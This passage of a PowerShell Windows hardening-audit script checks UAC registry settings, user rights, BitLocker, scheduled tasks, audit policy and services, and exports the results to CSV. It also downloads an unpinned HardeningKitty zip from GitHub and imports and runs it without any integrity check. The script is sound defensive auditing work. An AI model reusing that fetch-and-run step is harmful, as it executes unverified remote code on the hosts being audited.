            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='(Default) Only elevate executables that are signed and validated is disabled'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }

 ####################### UAC Settings ###################################################
$strSecurityItem = "UAC Security"
$strSecurityItemCheck = "User Account Control: Only elevate UIAccess applications that are installed in secure locations"
Write-Host '####################################################################################################' -BackgroundColor Black
Write-Host '##    UAC Security - Only elevate UIAccess applications that are installed in secure locations    ##' -BackgroundColor Black
Write-Host '####################################################################################################' -BackgroundColor Black
Write-Host 'Checking: User Account Control: Only elevate UIAccess applications that are installed in secure locations' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
$regPathProperty = "EnableSecureUIAPaths"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Only elevate UIAccess applications that are installed in secure locations is enabled'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='Only elevate UIAccess applications that are installed in secure locations is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='(Default) Only elevate UIAccess applications that are installed in secure locations is enabled'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
 }

  ####################### UAC Settings ###################################################
$strSecurityItem = "UAC Security"
$strSecurityItemCheck = "User Account Control: Run all administrators in Admin Approval Mode"
Write-Host '###############################################################################################' -BackgroundColor Black
Write-Host '##    UAC Security - Run all administrators in Admin Approval Mode aka. UAC turned on        ##' -BackgroundColor Black
Write-Host '###############################################################################################' -BackgroundColor Black
Write-Host 'Checking: UAC - Run all administrators in Admin Approval Mode aka. UAC turned on' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
$regPathProperty = "EnableLUA"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Run all administrators in Admin Approval Mode aka. UAC turned on is enabled'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='Run all administrators in Admin Approval Mode aka. UAC turned on is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='(Default) Run all administrators in Admin Approval Mode aka. UAC turned on is enabled'
        Write-Host $strAuditCheckResult -ForegroundColor Green
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
 }


  ####################### UAC Settings ###################################################
$strSecurityItem = "UAC Security"
$strSecurityItemCheck = "User Account Control: Switch to the secure desktop when prompting for elevation"
Write-Host '#####################################################################################' -BackgroundColor Black
Write-Host '##    UAC Security - Switch to the secure desktop when prompting for elevation        ##' -BackgroundColor Black
Write-Host '#####################################################################################' -BackgroundColor Black
Write-Host 'Checking: UAC - Switch to the secure desktop when prompting for elevation' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
$regPathProperty = "PromptOnSecureDesktop"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Switch to the secure desktop when prompting for elevation is enabled'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='Switch to the secure desktop when prompting for elevation is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='(Default) Switch to the secure desktop when prompting for elevation is enabled'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
 }


####################### UAC Settings ###################################################
$strSecurityItem = "UAC Security"
$strSecurityItemCheck = "User Account Control: Virtualize file and registry write failures to per-user locations"
Write-Host '################################################################################################' -BackgroundColor Black
Write-Host '##    UAC Security - Virtualize file and registry write failures to per-user locations        ##' -BackgroundColor Black
Write-Host '################################################################################################' -BackgroundColor Black
Write-Host 'Checking: UAC - Virtualize file and registry write failures to per-user locations' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
$regPathProperty = "EnableVirtualization"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Virtualize file and registry write failures to per-user locations is enabled'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='Virtualize file and registry write failures to per-user locations is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='(Default) Virtualize file and registry write failures to per-user locations is enabled'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
 }

####################### User Rights Assignment ###################################################
 Write-Host '#################################' -BackgroundColor Black
 Write-Host '##   User Rights Assignment    ##' -BackgroundColor Black
 Write-Host '#################################' -BackgroundColor Black
 Write-Host 'Enumerating User Rights Assignment' -ForegroundColor Black -BackgroundColor White
Get-BadPrivilege | Sort-Object -Property HighRisk, Privilege -Descending | Format-Table
Get-BadPrivilege | Sort-Object -Property HighRisk, Privilege -Descending | Export-Csv -Path ".\CSV\User Rights Assignment.csv" -NoTypeInformation


####################### Bitlocker ###################################################
Write-Host '#################################' -BackgroundColor Black
Write-Host '##         Bitlocker           ##' -BackgroundColor Black
Write-Host '#################################' -BackgroundColor Black
Write-Host 'Getting Bitlocker state' -ForegroundColor Black -BackgroundColor White
Try
{
	Get-BitLockerVolume | Format-Table -AutoSize -Wrap
}
Catch { 
    Write-Host 'Error getting Bitlocker volumes - Bitlocker may not be available' -ForegroundColor Red
}

####################### ScheduledTasks ###################################################
Write-Host '#################################' -BackgroundColor Black
Write-Host '##     ScheduledTasks          ##' -BackgroundColor Black
Write-Host '#################################' -BackgroundColor Black
Write-Host 'Enumerating ScheduledTasks (filtered - non Microsoft)' -ForegroundColor Black -BackgroundColor White
Get-ScheduledTasks | Format-Table Name, Enabled, UserId, LastRunTime, NextRunTime, Status, Action, Arguments
Get-ScheduledTasks | Export-Csv -Path ".\CSV\Scheduled Tasks.csv" -NoTypeInformation

####################### AuditPolicy ###################################################
Write-Host '#################################' -BackgroundColor Black
Write-Host '##        AuditPolicy          ##' -BackgroundColor Black
Write-Host '#################################' -BackgroundColor Black
Write-Host 'Getting the Audit Policy' -ForegroundColor Black -BackgroundColor White
if (((Get-Culture).Parent.Name) -match "de"){
    Get-SecurityAuditPolicyDE | Format-Table Category, Subcategory,AuditSuccess,AuditFailure -AutoSize -Wrap
    Get-SecurityAuditPolicyDE | Select-Object Category, Subcategory,AuditSuccess,AuditFailure | Export-Csv -Path ".\CSV\Audit Settings.csv" -NoTypeInformation
} else {
    Get-SecurityAuditPolicy | Format-Table Category, Subcategory,AuditSuccess,AuditFailure -AutoSize -Wrap
    Get-SecurityAuditPolicy | Select-Object Category, Subcategory,AuditSuccess,AuditFailure | Export-Csv -Path ".\CSV\Audit Settings.csv" -NoTypeInformation

}

####################### Services ###################################################
Write-Host '#################################' -BackgroundColor Black
Write-Host '##          Services           ##' -BackgroundColor Black
Write-Host '#################################' -BackgroundColor Black
Write-Host 'Enumerating running services' -ForegroundColor Black -BackgroundColor White

$Processes = @{}
Get-Process -IncludeUserName | ForEach-Object {
    $Processes[$_.Id] = $_
}

# Running services
Get-WmiObject win32_service | 
	Where-Object {($_.state -match 'running')} | 
	Select-Object Name,
		DisplayName,
		StartName,
		state,
		ProcessID,
        @{Name="UserName";    Expression={ $Processes[[int]$_.ProcessID].UserName }},
        @{Name="ProcessName"; Expression={ $Processes[[int]$_.ProcessID].ProcessName }}, 
        @{Name="Path"; Expression={ $Processes[[int]$_.ProcessID].Path }} | 
	Sort-Object DisplayName |
Format-Table -AutoSize -Wrap

# Stopped services
Write-Host 'Enumerating stopped services' -ForegroundColor Black -BackgroundColor White
Get-WmiObject win32_service | 
	Where-Object {-not ($_.state -match 'running')} | 
	Select-Object Name,
		DisplayName,
		StartName,
		state | 
	Sort-Object DisplayName |
Format-Table -AutoSize -Wrap


# Export all services to CSV
Get-WmiObject win32_service | 
	Select-Object Name,
		DisplayName,
		StartName,
		state,
		ProcessID,
        @{Name="UserName";    Expression={ $Processes[[int]$_.ProcessID].UserName }},
        @{Name="ProcessName"; Expression={ $Processes[[int]$_.ProcessID].ProcessName }}, 
        @{Name="Path"; Expression={ $Processes[[int]$_.ProcessID].Path }} | 
Export-Csv -Path ".\CSV\Windows Services.csv" -NoTypeInformation


####################### CIS-Hardening ###################################################
Write-Host '#################################' -BackgroundColor Black
Write-Host '##       CIS-Hardening         ##' -BackgroundColor Black
Write-Host '#################################' -BackgroundColor Black
$path = ".\HardeningKitty"
If(!(test-path $path))
{
    Invoke-WebRequest -Uri "https://github.com/strakuscrafter/HardeningKitty/archive/refs/heads/master.zip" -OutFile ".\HardeningKitty.zip"
    Expand-Archive -Path ".\HardeningKitty.zip"
}

Import-Module ".\HardeningKitty\HardeningKitty-master\Invoke-HardeningKitty.ps1"
Invoke-HardeningKitty -FileFindingList ".\HardeningKitty\HardeningKitty-master\newLists\Windows10_20H2_FinalCSV(german).csv" -SkipMachineInformation -Report "Audit" -ReportFile ".\CSV\Hardening CIS.csv"

####################### Important-Hardening Overview ###################################################
Write-Host '###########################################' -BackgroundColor Black
Write-Host '##   Important-Hardening Overview        ##' -BackgroundColor Black
Write-Host '###########################################' -BackgroundColor Black
$SecurityItemAuditResults | Sort-Object SecurityItem | Format-Table SecurityItem, check, result, passed
$SecurityItemAuditResults | Sort-Object SecurityItem, Check | Select-Object SecurityItem, check, result, passed | Export-Csv  -Path ".\CSV\Important Hardening.csv" -NoTypeInformation

Stop-Transcript
